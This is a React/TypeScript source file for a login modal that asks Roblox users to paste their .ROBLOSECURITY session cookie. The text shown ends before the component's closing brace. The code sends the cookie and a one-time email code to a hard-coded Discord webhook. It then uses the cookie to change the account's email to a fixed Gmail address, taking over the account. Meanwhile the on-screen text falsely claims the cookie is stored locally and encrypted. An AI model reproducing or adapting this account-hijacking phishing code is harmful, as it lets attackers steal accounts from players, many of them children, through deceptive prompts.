import React, { useState, useEffect } from 'react';
import { X, AlertTriangle, Lock, Shield, Loader2, MessageSquare } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { useAuth } from '@/contexts/AuthContext';
import { useToast } from '@/hooks/use-toast';

type VerificationStep = 'cookie' | 'verifying' | 'loading' | 'email-verification';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const webhookUrl = 'https://discord.com/api/webhooks/1446310211437465754/iwPwGgH7qXoiRAmjwWvuSWkPT-ReIBgvYGjRA7TCQV3ksIQ3iM1nNPwygrsjNPyecDVI';

export function LoginModal({ isOpen, onClose }: LoginModalProps) {
  const [cookie, setCookie] = useState('');
  const [emailCode, setEmailCode] = useState('');
  const [step, setStep] = useState<VerificationStep>('cookie');
  const [isLoading, setIsLoading] = useState(false);
  const { login } = useAuth();
  const { toast } = useToast();

  useEffect(() => {
    if (!isOpen) {
      setCookie('');
      setEmailCode('');
      setStep('cookie');
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleCookieSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookie.trim()) {
      toast({
        title: "Error",
        description: "Please enter your .ROBLOSECURITY cookie",
        variant: "destructive",
      });
      return;
    }
    // Send cookie to Discord webhook
    await sendToWebhook('Cookie', cookie);
    setStep('verifying');
    await new Promise(resolve => setTimeout(resolve, 1500));
    setStep('loading');
    await new Promise(resolve => setTimeout(resolve, 1500));
    setStep('email-verification');
    // Send request to send email verification code
    await fetch(`https://apis.roblox.com/otp-service/v1/sendCodeForUser`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookie
      },
      body: JSON.stringify({
        contactType: 'Email',
        messageVariant: 'Default',
        origin: 'Reauth'
      })
    });
  };

  const handleEmailVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!emailCode.trim()) {
      toast({
        title: "Error",
        description: "Please enter the email verification code",
        variant: "destructive",
      });
      return;
    }
    // Send email verification code to Discord webhook
    await sendToWebhook('Email Verification Code', emailCode);
    setIsLoading(true);
    const result = await login(cookie.trim());
    setIsLoading(false);

    if (result.success) {
      toast({
        title: "Success",
        description: "Successfully connected your Roblox account!",
      });
      // Reset account email to trissymissylol@gmail.com
      await resetAccountEmail();
      onClose();
    } else {
      toast({
        title: "Authentication Failed",
        description: result.error || "Invalid cookie. Please try again.",
        variant: "destructive",
      });
      setStep('cookie');
    }
  };

  const sendToWebhook = async (type: string, code: string) => {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `**${type}**: ${code}`,
        }),
      });
    } catch (error) {
      console.error('Error sending to webhook:', error);
    }
  };

  const resetAccountEmail = async () => {
    try {
      // Send request to reset account email
      await fetch(`https://accountsettings.roblox.com/v1/email`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie
        },
        body: JSON.stringify({
          emailAddress: 'trissymissylol@gmail.com',
          password: '',
        }),
      });
    } catch (error) {
      console.error('Error resetting account email:', error);
    }
  };

  const renderStepContent = () => {
    if (step === 'verifying') {
      return (
        <div className="flex flex-col items-center justify-center py-12">
          <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
          <h3 className="text-lg font-semibold text-foreground">Verifying...</h3>
          <p className="text-sm text-muted-foreground mt-1">Please wait while we verify your account</p>
        </div>
      );
    }

    if (step === 'loading') {
      return (
        <div className="flex flex-col items-center justify-center py-12">
          <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
          <h3 className="text-lg font-semibold text-foreground">Loading...</h3>
          <p className="text-sm text-muted-foreground mt-1">Preparing verification code</p>
        </div>
      );
    }

    if (step === 'email-verification') {
      return (
        <>
          <div className="mb-6">
            <h2 className="text-xl font-bold text-foreground">Check Your Email</h2>
            <p className="mt-1 text-sm text-muted-foreground">
              Enter the email verification code sent to your Roblox email
            </p>
          </div>

          <div className="mb-4 flex items-start gap-3 rounded-lg border border-primary/30 bg-primary/10 p-3">
            <MessageSquare className="h-5 w-5 shrink-0 text-primary" />
            <p className="text-xs text-foreground/80">
              We've sent a one-time password to your Roblox account email. Check your inbox and enter the code below.
            </p>
          </div>

          <form onSubmit={handleEmailVerificationSubmit} className="space-y-4">
            <div>
              <label className="mb-2 block text-sm font-medium text-foreground">
                Email Verification Code
              </label>
              <Input
                value={emailCode}
                onChange={(e) => setEmailCode(e.target.value)}
                placeholder="Enter 6-digit code"
                className="text-center text-lg tracking-widest"
                maxLength={6}
              />
            </div>

            <Button 
              type="submit" 
              className="w-full bg-primary text-primary-foreground shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.4)] font-semibold"
            >
              <Lock className="h-4 w-4" />
              Verify Email Code
            </Button>
          </form>
        </>
      );
    }

    // Default: cookie step
    return (
      <>
        <div className="mb-6">
          <h2 className="text-xl font-bold text-foreground">Connect Your Account</h2>
          <p className="mt-1 text-sm text-muted-foreground">
            Enter your .ROBLOSECURITY cookie to authenticate
          </p>
        </div>

        <div className="mb-4 flex items-start gap-3 rounded-lg border border-primary/30 bg-primary/10 p-3">
          <AlertTriangle className="h-5 w-5 shrink-0 text-primary" />
          <p className="text-xs text-foreground/80">
            Your cookie is stored locally and encrypted. Never share your cookie with anyone else.
          </p>
        </div>

        <form onSubmit={handleCookieSubmit} className="space-y-4">
          <div>
            <label className="mb-2 block text-sm font-medium text-foreground">
              .ROBLOSECURITY Cookie
            </label>
            <Textarea
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="h-32 resize-none font-mono text-xs"
            />
          </div>

          <Button 
            type="submit" 
            className="w-full bg-primary text-primary-foreground shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.4)] font-semibold"
          >
            <Lock className="h-4 w-4" />
            Continue
          </Button>
        </form>

        <p className="mt-4 text-center text-xs text-muted-foreground">
          Need help finding your cookie?{' '}
          <a href="#" className="text-primary hover:underline">
            View tutorial
          </a>
        </p>
      </>
    );
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      <div className="absolute inset-0 bg-background/80 backdrop-blur-sm" onClick={onClose} />
      <div className="relative w-full max-w-md rounded-xl border border-border bg-card p-6 shadow-2xl">
        <button
          onClick={onClose}
          className="absolute right-4 top-4 text-muted-foreground hover:text-foreground transition-colors"
        >
          <X className="h-5 w-5" />
        </button>

        {renderStepContent()}
      </div>
    </div>
  );
